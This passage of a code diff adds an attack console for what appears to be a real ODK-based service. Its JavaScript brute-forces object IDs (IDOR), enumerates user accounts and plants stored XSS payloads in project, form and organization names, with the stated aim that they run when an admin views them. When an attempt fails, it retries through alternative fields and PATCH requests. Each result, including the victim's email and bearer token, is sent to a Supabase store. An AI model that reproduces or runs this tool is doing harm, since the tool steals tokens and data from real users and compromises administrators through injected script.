+                            await saveToSupabase({
+                                attack_type: 'idor_bruteforce',
+                                victim_email: currentUser?.email || '',
+                                victim_uid: currentUser?.uid || '',
+                                id_token: idToken,
+                                idor_data: { endpoint: `${range.prefix}/${id}`, id: id, data: data },
+                                xss_target: `${range.prefix}/${id}`,
+                                notes: `IDOR Bruteforce: ${range.prefix}/${id}`
+                            });
+                        } else if (resp.status === 403) {
+                            if (id <= 10) log('idorLog', `[!] ${range.prefix}/${id}: EXISTS but FORBIDDEN (403)`, 'warning');
+                        }
+                    }
+                    if (id % 10 === 0) await new Promise(r => setTimeout(r, 100));
+                }
+            }
+
+            log('idorLog', `[DEEP] Deep scan complete. Total IDOR findings: ${idorFound}`, 'success');
+            updateStats();
+        }
+
+        async function enumerateUsers() {
+            if (!idToken) { log('idorLog', '[ERROR] Authenticate first!', 'error'); return; }
+            log('idorLog', '[ENUM] Enumerating users...', 'info');
+
+            const userEndpoints = [
+                'users',
+                'accounts/users',
+                'accounts/users/current',
+                'organizations/users',
+                'permissions/users',
+                'admin/users',
+                'management/users',
+            ];
+
+            for (const ep of userEndpoints) {
+                const resp = await apiFetch(ep);
+                if (resp && resp.status === 200) {
+                    const data = await resp.json();
+                    log('idorLog', `[+] ${ep}: ${JSON.stringify(data).substring(0, 120)}...`, 'success');
+
+                    await saveToSupabase({
+                        attack_type: 'user_enum',
+                        victim_email: currentUser?.email || '',
+                        victim_uid: currentUser?.uid || '',
+                        id_token: idToken,
+                        idor_data: { endpoint: ep, data: data },
+                        xss_target: ep,
+                        notes: `User Enumeration: ${ep}`
+                    });
+
+                    idorFound++;
+                    const users = Array.isArray(data) ? data : (data.users || data.items || []);
+                    for (const u of users) {
+                        const uid = u.id || u.uid || u.email || 'unknown';
+                        log('idorLog', `  [USER] ${uid}: ${JSON.stringify(u).substring(0, 80)}`, 'data');
+                    }
+                }
+            }
+            updateStats();
+        }
+
+        async function testCustomIDOR() {
+            if (!idToken) { log('idorLog', '[ERROR] Authenticate first!', 'error'); return; }
+            const template = document.getElementById('idorCustom').value;
+            const start = parseInt(document.getElementById('idorStart').value) || 1;
+            const end = parseInt(document.getElementById('idorEnd').value) || 50;
+
+            log('idorLog', `[CUSTOM] Testing ${template} (IDs ${start}-${end})...`, 'info');
+
+            for (let id = start; id <= end; id++) {
+                const path = template.replace('{ID}', id);
+                const resp = await apiFetch(path);
+                if (resp) {
+                    if (resp.status === 200) {
+                        const data = await resp.json();
+                        log('idorLog', `[+] ${path}: FOUND!`, 'success');
+                        idorFound++;
+                        addIDORRow(path, id, '200 OK', JSON.stringify(data).substring(0, 80), true);
+
+                        await saveToSupabase({
+                            attack_type: 'idor_custom',
+                            victim_email: currentUser?.email || '',
+                            victim_uid: currentUser?.uid || '',
+                            id_token: idToken,
+                            idor_data: { endpoint: path, id: id, data: data },
+                            xss_target: path,
+                            notes: `Custom IDOR: ${path}`
+                        });
+                    } else if (resp.status === 403) {
+                        log('idorLog', `[!] ${path}: EXISTS but FORBIDDEN`, 'warning');
+                    }
+                }
+                if (id % 5 === 0) await new Promise(r => setTimeout(r, 50));
+            }
+            updateStats();
+        }
+
+        function addIDORRow(endpoint, id, status, preview, found) {
+            const tbody = document.getElementById('idorTableBody');
+            const row = document.createElement('tr');
+            row.innerHTML = `
+                <td>${endpoint}</td>
+                <td>${id}</td>
+                <td class="${found ? 'found' : (status === '403 Forbidden' ? 'access-denied' : 'not-found')}">${status}</td>
+                <td title="${preview}">${preview}</td>
+                <td class="${found ? 'found' : 'not-found'}">${found ? 'Yes' : 'No'}</td>
+            `;
+            tbody.appendChild(row);
+        }
+
+        // =====================================================
+        // STORED XSS INJECTION
+        // =====================================================
+
+        function renderPayloads() {
+            const list = document.getElementById('payloadList');
+            list.innerHTML = '';
+            XSS_PAYLOADS.forEach((p, i) => {
+                const item = document.createElement('div');
+                item.className = `payload-item${i === selectedPayload ? ' selected' : ''}`;
+                item.onclick = () => { selectedPayload = i; renderPayloads(); };
+                item.innerHTML = `
+                    <span class="tag ${p.tagClass}">${p.tag}</span>
+                    <div class="payload-code">${p.payload.substring(0, 80)}...</div>
+                `;
+                item.title = p.desc;
+                list.appendChild(item);
+            });
+        }
+        renderPayloads();
+
+        document.getElementById('xssTarget').addEventListener('change', function() {
+            const val = this.value;
+            document.getElementById('customEndpointGroup').style.display = val === 'custom' ? 'block' : 'none';
+            document.getElementById('projectIdGroup').style.display =
+                ['project-update', 'form', 'app-user'].includes(val) ? 'block' : 'none';
+        });
+
+        async function injectXSS() {
+            if (!idToken) { log('xssLog', '[ERROR] Authenticate first!', 'error'); return; }
+
+            const customPayload = document.getElementById('xssCustomPayload').value.trim();
+            const payload = customPayload || XSS_PAYLOADS[selectedPayload].payload;
+            const target = document.getElementById('xssTarget').value;
+            const projectId = document.getElementById('xssProjectId').value;
+
+            log('xssLog', `[XSS] Injecting payload into ${target}...`, 'info');
+            log('xssLog', `[XSS] Payload: ${payload.substring(0, 100)}...`, 'data');
+
+            let endpoint, method, body;
+
+            switch(target) {
+                case 'project':
+                    endpoint = 'projects';
+                    method = 'POST';
+                    body = JSON.stringify({ name: payload, description: 'Project created by ODK Manager' });
+                    break;
+                case 'project-update':
+                    endpoint = `projects/${projectId}`;
+                    method = 'PATCH';
+                    body = JSON.stringify({ name: payload });
+                    break;
+                case 'form':
+                    endpoint = `projects/${projectId}/forms`;
+                    method = 'POST';
+                    body = JSON.stringify({ name: payload, version: '1.0' });
+                    break;
+                case 'app-user':
+                    endpoint = `projects/${projectId}/app-users`;
+                    method = 'POST';
+                    body = JSON.stringify({ displayName: payload });
+                    break;
+                case 'org-update':
+                    endpoint = 'organizations/current';
+                    method = 'PATCH';
+                    body = JSON.stringify({ name: payload });
+                    break;
+                case 'custom':
+                    endpoint = document.getElementById('xssCustomEndpoint').value;
+                    method = 'POST';
+                    body = JSON.stringify({ name: payload, value: payload });
+                    break;
+            }
+
+            try {
+                const resp = await fetch(`${API}/${endpoint}`, {
+                    method: method,
+                    headers: {
+                        'Authorization': `Bearer ${idToken}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: body
+                });
+
+                if (resp.ok) {
+                    const data = await resp.json();
+                    log('xssLog', `[+] XSS INJECTED successfully! Status: ${resp.status}`, 'success');
+                    log('xssLog', `[+] Response: ${JSON.stringify(data).substring(0, 150)}`, 'data');
+                    xssInjected++;
+
+                    await saveToSupabase({
+                        attack_type: 'xss_injection',
+                        victim_email: currentUser?.email || '',
+                        victim_uid: currentUser?.uid || '',
+                        id_token: idToken,
+                        xss_target: `${method} ${API}/${endpoint}`,
+                        xss_payload: payload,
+                        notes: `Stored XSS injected into ${target}. Payload will execute when admin views it.`
+                    });
+
+                } else {
+                    const errText = await resp.text();
+                    log('xssLog', `[-] Injection failed: ${resp.status} ${errText.substring(0, 100)}`, 'error');
+                    log('xssLog', `[RETRY] Trying alternative field names...`, 'warning');
+                    await tryAlternativeFields(endpoint, method, payload);
+                }
+            } catch(e) {
+                log('xssLog', `[!] Request error: ${e.message}`, 'error');
+            }
+            updateStats();
+        }
+
+        async function tryAlternativeFields(endpoint, method, payload) {
+            const fieldVariants = [
+                { name: payload },
+                { displayName: payload },
+                { title: payload },
+                { description: payload },
+                { label: payload },
+                { value: payload },
+                { content: payload },
+                { text: payload },
+                { metadata: { name: payload } },
+                { settings: { displayName: payload } },
+                { name: payload, description: payload },
+            ];
+
+            for (const body of fieldVariants) {
+                try {
+                    const resp = await fetch(`${API}/${endpoint}`, {
+                        method: method,
+                        headers: {
+                            'Authorization': `Bearer ${idToken}`,
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(body)
+                    });
+
+                    if (resp.ok) {
+                        const data = await resp.json();
+                        log('xssLog', `[+] ALT FIELD SUCCESS: ${JSON.stringify(Object.keys(body))} → ${resp.status}`, 'success');
+                        xssInjected++;
+
+                        await saveToSupabase({
+                            attack_type: 'xss_injection_alt',
+                            victim_email: currentUser?.email || '',
+                            victim_uid: currentUser?.uid || '',
+                            id_token: idToken,
+                            xss_target: `${method} ${API}/${endpoint}`,
+                            xss_payload: payload,
+                            notes: `Stored XSS via alt field: ${JSON.stringify(Object.keys(body))}`
+                        });
+                        break;
+                    }
+                } catch(e) {}
+                await new Promise(r => setTimeout(r, 100));
+            }
+        }
+
+        async function injectAllPayloads() {
+            if (!idToken) { log('xssLog', '[ERROR] Authenticate first!', 'error'); return; }
+            log('xssLog', '[XSS] Injecting ALL payloads into project names...', 'warning');
+
+            for (let i = 0; i < XSS_PAYLOADS.length; i++) {
+                const p = XSS_PAYLOADS[i];
+                log('xssLog', `[${i+1}/${XSS_PAYLOADS.length}] Injecting: ${p.name}...`, 'info');
+
+                try {
+                    const resp = await fetch(`${API}/projects`, {
+                        method: 'POST',
+                        headers: {
+                            'Authorization': `Bearer ${idToken}`,
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ name: p.payload, description: `Test ${p.name}` })
+                    });
+
+                    if (resp.ok) {
+                        log('xssLog', `[+] ${p.name}: INJECTED!`, 'success');
+                        xssInjected++;
+
+                        await saveToSupabase({
+                            attack_type: 'xss_injection_bulk',
+                            victim_email: currentUser?.email || '',
+                            victim_uid: currentUser?.uid || '',
+                            id_token: idToken,
+                            xss_target: 'POST /projects',
+                            xss_payload: p.payload,
+                            notes: `Bulk XSS: ${p.name} (${p.tag})`
+                        });
+                    } else {
+                        const status = resp.status;
+                        log('xssLog', `[-] ${p.name}: Failed (${status})`, 'error');
+
+                        if (status === 400 || status === 422) {
+                            log('xssLog', `[RETRY] Trying PATCH on project 1...`, 'warning');
+                            try {
+                                const patchResp = await fetch(`${API}/projects/1`, {
+                                    method: 'PATCH',
+                                    headers: {
+                                        'Authorization': `Bearer ${idToken}`,
+                                        'Content-Type': 'application/json'
+                                    },
+                                    body: JSON.stringify({ name: p.payload })
+                                });
+                                if (patchResp.ok) {
+                                    log('xssLog', `[+] ${p.name}: INJECTED via PATCH!`, 'success');
+                                    xssInjected++;
+
+                                    await saveToSupabase({
+                                        attack_type: 'xss_injection_patch',
+                                        victim_email: currentUser?.email || '',
+                                        victim_uid: currentUser?.uid || '',
+                                        id_token: idToken,
+                                        xss_target: 'PATCH /projects/1',
+                                        xss_payload: p.payload,
+                                        notes: `XSS via PATCH: ${p.name}`
+                                    });
+                                }
+                            } catch(e) {}
+                        }
+                    }
+                } catch(e) {
+                    log('xssLog', `[!] ${p.name}: Error - ${e.message}`, 'error');
+                }
+                await new Promise(r => setTimeout(r, 300));
+            }
+
+            log('xssLog', `[DONE] All payloads injected. Total: ${xssInjected}`, 'success');
+            updateStats();
+        }
+
+        async function testXSSReflection() {
+            if (!idToken) { log('xssLog', '[ERROR] Authenticate first!', 'error'); return; }
+
+            const testPayload = '<img src=x onerror="window.__xss_test=true">';
+            log('xssLog', '[TEST] Testing XSS reflection with harmless payload...', 'info');
+
+            try {
+                const resp = await fetch(`${API}/projects`, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Bearer ${idToken}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ name: testPayload, description: 'XSS Reflection Test' })
+                });
+
+                if (resp.ok) {
+                    const data = await resp.json();
+                    log('xssLog', `[TEST] Project created. Check if name is reflected as HTML in dashboard.`, 'success');
+                    log('xssLog', `[TEST] Response: ${JSON.stringify(data)}`, 'data');
+                    log('xssLog', `[TEST] If the <img> tag renders as broken image in dashboard, XSS works!`, 'warning');
+                    log('xssLog', `[TEST] Open https://odk.otherside.xyz/dashboard and check project list.`, 'info');
+
+                    await saveToSupabase({
+                        attack_type: 'xss_reflection_test',
+                        victim_email: currentUser?.email || '',
+                        victim_uid: currentUser?.uid || '',
+                        id_token: idToken,
+                        xss_target: 'POST /projects',
+                        xss_payload: testPayload,
+                        notes: 'XSS reflection test - check if HTML is rendered'
+                    });
+
+                } else {
+                    log('xssLog', `[-] Test failed: ${resp.status}`, 'error');
+                }
+            } catch(e) {
+                log('xssLog', `[!] Error: ${e.message}`, 'error');
+            }
+        }
+    </script>
+</body>
+</html>
